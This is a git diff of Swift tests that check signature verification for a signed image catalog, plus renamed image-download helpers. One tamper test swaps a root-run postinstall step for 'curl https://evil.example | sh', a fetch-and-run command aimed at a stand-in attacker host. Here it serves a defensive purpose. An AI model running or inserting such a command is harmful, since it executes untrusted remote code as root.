@@ -1,5 +1,6 @@
 import Crypto
 import Foundation
+import SandboxEngine
 import Testing
 @testable import bromure_ac
 
@@ -131,7 +132,8 @@ struct ImageCatalogSignatureTests {
         }
         """.utf8))
         let signedAt = "2026-07-02T10:00:00.000Z"
-        let payload = try #require(cat.signingPayload(signedAt: signedAt))
+        let payload = try #require(cat.signingPayload(
+            signedAt: signedAt, magic: ImageDistribution.agentCoding.signingMagic))
         let sig = try key.signature(for: payload)
         cat.signature = .init(signedAt: signedAt, edSignature: sig.base64EncodedString())
         return cat
@@ -142,26 +144,26 @@ struct ImageCatalogSignatureTests {
         let key = Curve25519.Signing.PrivateKey()
         let pub = key.publicKey.rawRepresentation.base64EncodedString()
         let cat = try makeSignedCatalog(key: key)
-        #expect(ImageCatalogStore.isSignatureValid(cat, publicKeyBase64: pub))
+        #expect(ImageCatalogStore.isSignatureValid(cat, magic: ImageDistribution.agentCoding.signingMagic, publicKeyBase64: pub))
 
         // Root-executed commands are exactly what the signature must pin.
         var evilCommand = cat
         evilCommand.postinstall[0].command = "curl https://evil.example | sh"
-        #expect(!ImageCatalogStore.isSignatureValid(evilCommand, publicKeyBase64: pub))
+        #expect(!ImageCatalogStore.isSignatureValid(evilCommand, magic: ImageDistribution.agentCoding.signingMagic, publicKeyBase64: pub))
 
         var evilImage = cat
         evilImage.image?.disk.sha256 = "ddeeff"
-        #expect(!ImageCatalogStore.isSignatureValid(evilImage, publicKeyBase64: pub))
+        #expect(!ImageCatalogStore.isSignatureValid(evilImage, magic: ImageDistribution.agentCoding.signingMagic, publicKeyBase64: pub))
 
         var evilTime = cat
         evilTime.signature?.signedAt = "2030-01-01T00:00:00.000Z"
-        #expect(!ImageCatalogStore.isSignatureValid(evilTime, publicKeyBase64: pub))
+        #expect(!ImageCatalogStore.isSignatureValid(evilTime, magic: ImageDistribution.agentCoding.signingMagic, publicKeyBase64: pub))
 
         // Adding a step invalidates too.
         var evilExtra = cat
         evilExtra.postinstall.append(PostinstallStep(
             uuid: "s3", seq: 30, description: "Extra", command: "echo extra"))
-        #expect(!ImageCatalogStore.isSignatureValid(evilExtra, publicKeyBase64: pub))
+        #expect(!ImageCatalogStore.isSignatureValid(evilExtra, magic: ImageDistribution.agentCoding.signingMagic, publicKeyBase64: pub))
     }
 
     @Test("Unsigned or wrong-key catalogs never verify")
@@ -172,11 +174,12 @@ struct ImageCatalogSignatureTests {
         var unsigned = cat
         unsigned.signature = nil
         #expect(!ImageCatalogStore.isSignatureValid(
-            unsigned, publicKeyBase64: key.publicKey.rawRepresentation.base64EncodedString()))
+            unsigned, magic: ImageDistribution.agentCoding.signingMagic,
+            publicKeyBase64: key.publicKey.rawRepresentation.base64EncodedString()))
 
         // Signed with a key other than the pinned one (here: the real
         // production key) — must not verify.
-        #expect(!ImageCatalogStore.isSignatureValid(cat))
+        #expect(!ImageCatalogStore.isSignatureValid(cat, magic: ImageDistribution.agentCoding.signingMagic))
     }
 
     @Test("Payload canonicalization: sha case-insensitive, step order irrelevant")
@@ -190,7 +193,7 @@ struct ImageCatalogSignatureTests {
         // either (lowercased in the payload).
         cat.postinstall.reverse()
         cat.image?.disk.sha256 = "aabbcc"
-        #expect(ImageCatalogStore.isSignatureValid(cat, publicKeyBase64: pub))
+        #expect(ImageCatalogStore.isSignatureValid(cat, magic: ImageDistribution.agentCoding.signingMagic, publicKeyBase64: pub))
     }
 
     @Test("Signature survives a JSON round-trip")
@@ -200,7 +203,7 @@ struct ImageCatalogSignatureTests {
         let cat = try makeSignedCatalog(key: key)
         let data = try JSONEncoder().encode(cat)
         let back = try ImageCatalog.parse(data)
-        #expect(ImageCatalogStore.isSignatureValid(back, publicKeyBase64: pub))
+        #expect(ImageCatalogStore.isSignatureValid(back, magic: ImageDistribution.agentCoding.signingMagic, publicKeyBase64: pub))
     }
 }
 
@@ -230,7 +233,7 @@ struct ImageDownloadPlumbingTests {
         defer { try? FileManager.default.removeItem(at: dir) }
         let file = dir.appendingPathComponent("abc.txt")
         try Data("abc".utf8).write(to: file)
-        let hash = try UbuntuImageManager.sha256Streaming(of: file)
+        let hash = try ImageFetch.sha256Streaming(of: file)
         #expect(hash == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")
     }
 
@@ -251,7 +254,7 @@ struct ImageDownloadPlumbingTests {
         let gz = try gzip(raw)
 
         let out = dir.appendingPathComponent("expanded.img")
-        try UbuntuImageManager.expandGzipSparse(
+        try ImageFetch.expandGzipSparse(
             from: gz, to: out,
             expectedBytes: Int64(fixture.count),
             progress: { _ in })
@@ -271,8 +274,8 @@ struct ImageDownloadPlumbingTests {
         let gz = try gzip(raw)
 
         let out = dir.appendingPathComponent("expanded.img")
-        #expect(throws: UbuntuImageError.self) {
-            try UbuntuImageManager.expandGzipSparse(
+        #expect(throws: ImageFetchError.self) {
+            try ImageFetch.expandGzipSparse(
                 from: gz, to: out,
                 expectedBytes: 2048,   // catalog lies about the size
                 progress: { _ in })
@@ -287,8 +290,8 @@ struct ImageDownloadPlumbingTests {
         try Data("this is not gzip".utf8).write(to: gz)
 
         let out = dir.appendingPathComponent("expanded.img")
-        #expect(throws: UbuntuImageError.self) {
-            try UbuntuImageManager.expandGzipSparse(
+        #expect(throws: ImageFetchError.self) {
+            try ImageFetch.expandGzipSparse(
                 from: gz, to: out,
                 expectedBytes: 16,
                 progress: { _ in })
